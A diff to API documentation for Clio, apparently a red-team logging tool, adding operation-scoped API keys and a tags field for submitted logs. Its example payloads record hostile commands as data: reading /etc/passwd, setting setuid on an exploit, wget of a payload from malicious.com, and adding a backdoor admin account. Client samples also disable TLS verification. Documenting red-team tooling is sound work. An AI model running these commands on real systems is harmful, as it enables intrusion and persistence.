@@ -15,9 +15,21 @@ API keys can only be created by administrators through the Clio web interface:
    - **Name**: A descriptive name for the key
    - **Description**: (Optional) Information about key usage
    - **Permissions**: Select appropriate permissions
+   - **Operation**: (Optional) Scope the key to a specific operation
    - **Expiration**: (Optional) Set an expiration date
 
 The generated API key will be displayed only once. Make sure to copy and store it securely.
+
+### Operation-Scoped API Keys
+
+API keys can be scoped to specific operations. When an API key is associated with an operation:
+
+- All logs submitted via that API key are automatically tagged with the operation's tag
+- Users don't need to specify the operation in the API request
+- The operation name is included in the API response
+- This simplifies log submission and ensures consistent operation tagging
+
+**Example:** If you create an API key scoped to "Operation Red Storm", all logs submitted with that key will automatically receive the "OP:Red Storm" tag.
 
 ### API Key Format
 
@@ -88,7 +100,8 @@ POST /api/ingest/logs
   "command": "cat /etc/passwd",
   "notes": "Privilege escalation attempt",
   "filename": "passwd",
-  "status": "ON_DISK"
+  "status": "ON_DISK",
+  "tags": ["OP1", "privilege-escalation", "linux"]
 }
 ```
 
@@ -98,13 +111,15 @@ POST /api/ingest/logs
   {
     "internal_ip": "192.168.1.100",
     "hostname": "host-1",
-    "command": "chmod +s /tmp/exploit"
+    "command": "chmod +s /tmp/exploit",
+    "tags": ["OP1", "privilege-escalation"]
   },
   {
     "external_ip": "198.51.100.1",
     "hostname": "host-2",
     "domain": "example.org",
-    "command": "wget http://malicious.com/payload"
+    "command": "wget http://malicious.com/payload",
+    "tags": ["OP2", "payload-delivery"]
   }
 ]
 ```
@@ -116,15 +131,24 @@ POST /api/ingest/logs
   "results": [
     {
       "id": 1234,
-      "success": true
+      "success": true,
+      "timestamp": "2025-03-06T14:30:45.123Z",
+      "operation": "Operation Red Storm",
+      "tags": ["OP:Red Storm", "privilege-escalation"]
     },
     {
       "id": 1235,
-      "success": true
+      "success": true,
+      "timestamp": "2025-03-06T14:30:45.456Z",
+      "operation": "Operation Red Storm",
+      "tags": ["OP:Red Storm", "payload-delivery"]
     }
-  ]
+  ],
+  "serverTime": "2025-03-06T14:30:45.500Z"
 }
 ```
+
+**Note:** The `operation` field is only included in the response if the API key is scoped to a specific operation.
 
 ## Field Descriptions
 
@@ -142,6 +166,25 @@ POST /api/ingest/logs
 | hash_algorithm | Hash algorithm used (MD5, SHA1, etc.) | 20 | No |
 | hash_value | File hash value | 128 | No |
 | secrets | Credentials or tokens (automatically masked) | 150 | No |
+| tags | Array of tag names to apply to the log (operations, categories, etc.) | Array | No |
+
+### Tags
+
+Tags are used to categorize and organize logs, including operation names (e.g., "OP1", "OP2") and descriptive labels (e.g., "privilege-escalation", "lateral-movement"). Tags provided via the API will:
+
+- Be created automatically if they don't already exist
+- Be applied to the log immediately upon creation
+- Be visible in the Clio UI alongside other tags
+- Be used for filtering and scoping logs by operation
+
+**Example with operation tags:**
+```json
+{
+  "hostname": "target-server",
+  "command": "net user administrator /add backdoor",
+  "tags": ["OP-RedTeam-2025", "persistence", "windows"]
+}
+```
 
 ## Error Responses
 
@@ -166,7 +209,7 @@ To ensure system stability, API requests are rate-limited:
 ### cURL Example
 
 ```bash
-curl -k -X POST https://your-IP-or-Host/ingest/logs \
+curl -k -X POST https://your-IP-or-Host/api/ingest/logs \
   -H "Content-Type: application/json" \
   -H "X-API-Key: rtl_yourkey_abc123" \
   -d '{
@@ -178,7 +221,8 @@ curl -k -X POST https://your-IP-or-Host/ingest/logs \
     "command": "cat /etc/passwd",
     "notes": "Privilege escalation attempt",
     "filename": "passwd",
-    "status": "ON_DISK"
+    "status": "ON_DISK",
+    "tags": ["OP1", "privilege-escalation", "linux"]
   }'
 ```
 
@@ -192,12 +236,12 @@ import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 def send_log(api_key, log_data):
-    url = "https://your-IP-or-Host/ingest/logs"
+    url = "https://your-IP-or-Host/api/ingest/logs"
     headers = {
         "Content-Type": "application/json",
         "X-API-Key": api_key
     }
-    
+
     response = requests.post(url, headers=headers, json=log_data, verify=False)
     response.raise_for_status()
     return response.json()
@@ -208,7 +252,8 @@ log_data = {
     "internal_ip": "192.168.1.100",
     "hostname": "victim-host",
     "command": "cat /etc/passwd",
-    "status": "ON_DISK"
+    "status": "ON_DISK",
+    "tags": ["OP1", "privilege-escalation"]
 }
 
 result = send_log(api_key, log_data)
@@ -221,7 +266,7 @@ print(result)
 # Disable SSL certificate validation for self-signed certs
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 
-$url = "https://your-IP-or-Host/ingest/logs"
+$url = "https://your-IP-or-Host/api/ingest/logs"
 $headers = @{
     "Content-Type" = "application/json"
     "X-API-Key" = "rtl_yourkey_abc123"
@@ -236,6 +281,7 @@ $payload = @{
     notes = "Privilege escalation attempt"
     filename = "passwd"
     status = "ON_DISK"
+    tags = @("OP1", "privilege-escalation", "windows")
 } | ConvertTo-Json
 
 $response = Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $payload -ContentType "application/json"
